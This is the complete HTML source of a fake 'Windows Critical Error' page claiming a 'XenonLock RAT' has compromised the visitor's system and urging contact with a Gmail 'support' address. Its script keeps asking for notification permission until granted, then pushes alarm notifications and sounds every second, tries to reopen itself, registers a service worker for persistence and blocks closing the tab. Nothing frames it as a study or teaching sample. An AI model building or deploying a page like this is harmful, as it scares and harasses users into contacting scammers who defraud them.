<!DOCTYPE html>
<html>
<head>
    <title>Windows Critical Error</title>
    <style>
        body {
            font-family: "Microsoft Sans Serif", Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .error-box {
            width: 500px;
            height: 250px;
            background-color: white;
            border: 1px solid #ccc;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            position: relative;
            text-align: center;
            border-radius: 5px;
        }
        .error-title {
            font-size: 14pt;
            font-weight: bold;
            margin-top: 20px;
            margin-bottom: 10px;
        }
        .error-message {
            font-size: 12pt;
            margin: 10px 20px;
        }
        .error-support {
            font-size: 10pt;
            margin: 20px;
            color: #333;
        }
        .error-icon {
            position: absolute;
            top: 10px;
            left: 10px;
            width: 24px;
            height: 24px;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDJMMTMuMDkgMC44NkgxMkwxMiA4VjJ6bTAgMkgxMlYxNkg4di04em0wIDBoMjR2MjR6IiBmaWxsPSIjRkYwMDAwIi8+PC9zdmc+');
        }
    </style>
</head>
<body>
    <div class="error-box">
        <div class="error-icon"></div>
        <div class="error-title">XenonLock RAT</div>
        <div class="error-message">XenonLock RAT detected! Your system is compromised.</div>
        <div class="error-support">Contact Support at Xenonlocksupport@gmail.com</div>
    </div>

    <script>
        // Request notification permission immediately
        Notification.requestPermission().then(permission => {
            if (permission === "granted") {
                startNotifications();
            } else {
                // If denied, keep asking every 5 seconds until allowed
                const interval = setInterval(() => {
                    Notification.requestPermission().then(newPermission => {
                        if (newPermission === "granted") {
                            clearInterval(interval);
                            startNotifications();
                        }
                    });
                }, 5000);
            }
        });

        function startNotifications() {
            // Show notification every second
            setInterval(() => {
                const notification = new Notification("Windows Critical Error", {
                    body: "XenonLock RAT detected! Your system is compromised. Contact Support at Xenonlocksupport@gmail.com",
                    icon: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDJMMTMuMDkgMC44NkgxMkwxMiA4VjJ6bTAgMkgxMlYxNkg4di04em0wIDBoMjR2MjR6IiBmaWxsPSIjRkYwMDAwIi8+PC9zdmc+'
                });

                // Play a sound
                const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2teleQAA');
                audio.play().catch(e => console.log("Audio play failed:", e));

                // Open a new window if closed
                if (!window || window.closed || typeof window === 'undefined') {
                    window.open(location.href, '_blank');
                }
            }, 1000);

            // Register Service Worker for persistent notifications
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/sw.js');
            }
        }

        // Prevent window close
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
        });
    </script>
</body>
</html>
